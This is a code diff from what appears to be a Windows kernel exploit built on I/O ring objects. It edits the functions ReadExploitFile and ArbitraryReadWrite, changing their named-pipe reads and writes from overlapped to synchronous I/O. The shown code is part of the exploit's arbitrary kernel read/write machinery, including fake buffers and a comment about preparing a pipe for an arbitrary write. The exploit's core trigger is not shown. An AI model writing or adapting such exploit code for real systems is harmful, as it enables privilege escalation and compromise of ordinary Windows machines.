@@ -556,7 +556,6 @@ ReadExploitFile (
     PVOID buf;
     DWORD bytesRead;
     BOOL res;
-    OVERLAPPED overlapped;
 
     buf = VirtualAlloc(NULL,
                        KERNEL_READ_SIZE,
@@ -567,21 +566,12 @@ ReadExploitFile (
         goto Exit;
     }
 
-    RtlZeroMemory(&overlapped, sizeof(overlapped));
     res = ReadFile(OutputFileHandle,
                    buf,
                    0x1000,
                    &bytesRead,
-                   &overlapped);
-    if ((res == FALSE) && (GetLastError() == ERROR_IO_PENDING))
-    {
-        if (GetOverlappedResult(OutputFileHandle, &overlapped, &bytesRead, TRUE) == FALSE)
-        {
-            printf("Failed reading file %d\n", GetLastError());
-            goto Exit;
-        }
-    }
-    else if (res == FALSE)
+                   NULL);
+    if (res == FALSE)
     {
         printf("Failed reading file %d\n", GetLastError());
         goto Exit;
@@ -620,11 +610,9 @@ ArbitraryReadWrite (
 
     PVOID addressForFakeBuffers;
     PULONG64 fake_buffers;
-    ULONG flagsAndAttributes;
     PIORING_OBJECT ioringAddress;
     ULONG numberOfFakeBuffers;
     ULONG64 zeroAddress;
-    OVERLAPPED overlapped;
     BOOLEAN mcBufferArraySupported;
     ULONG newBufferIndex;
 
@@ -723,14 +711,13 @@ ArbitraryReadWrite (
         goto Exit;
     }
 
-    flagsAndAttributes = FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED;
     outputClientPipe = CreateFile(OUTPUT_PIPE_NAME,
-                                   GENERIC_READ | GENERIC_WRITE,
-                                   FILE_SHARE_READ | FILE_SHARE_WRITE,
-                                   NULL,
-                                   OPEN_ALWAYS,
-                                   flagsAndAttributes,
-                                   NULL);
+                                  GENERIC_READ | GENERIC_WRITE,
+                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                  NULL,
+                                  OPEN_ALWAYS,
+                                  FILE_ATTRIBUTE_NORMAL,
+                                  NULL);
 
     if (outputClientPipe == INVALID_HANDLE_VALUE)
     {
@@ -739,12 +726,12 @@ ArbitraryReadWrite (
     }
 
     inputClientPipe = CreateFile(INPUT_PIPE_NAME,
-                                  GENERIC_READ | GENERIC_WRITE,
-                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
-                                  NULL,
-                                  OPEN_ALWAYS,
-                                  flagsAndAttributes,
-                                  NULL);
+                                 GENERIC_READ | GENERIC_WRITE,
+                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                 NULL,
+                                 OPEN_ALWAYS,
+                                 FILE_ATTRIBUTE_NORMAL,
+                                 NULL);
 
     if (inputClientPipe == INVALID_HANDLE_VALUE)
     {
@@ -827,18 +814,11 @@ Cleanup:
     // First, write 0 into the input pipe, so we can use it for our arbitrary write.
     //
     zeroBuf = 0;
-    RtlZeroMemory(&overlapped, sizeof(overlapped));
-    if (WriteFile(inputPipe, &zeroBuf, sizeof(PVOID), &bytesWritten, &overlapped) == FALSE)
+    if (WriteFile(inputPipe, &zeroBuf, sizeof(PVOID), &bytesWritten, NULL) == FALSE)
     {
         result = GetLastError();
-        if (result == ERROR_IO_PENDING)
-        {
-            if (GetOverlappedResult(inputClientPipe, &overlapped, &bytesWritten, TRUE) == FALSE)
-            {
-                result = GetLastError();
-                goto Exit;
-            }
-        }
+        printf("Failed to write into the input pipe: 0x%x\n", result);
+        goto Exit;
     }
 
     //
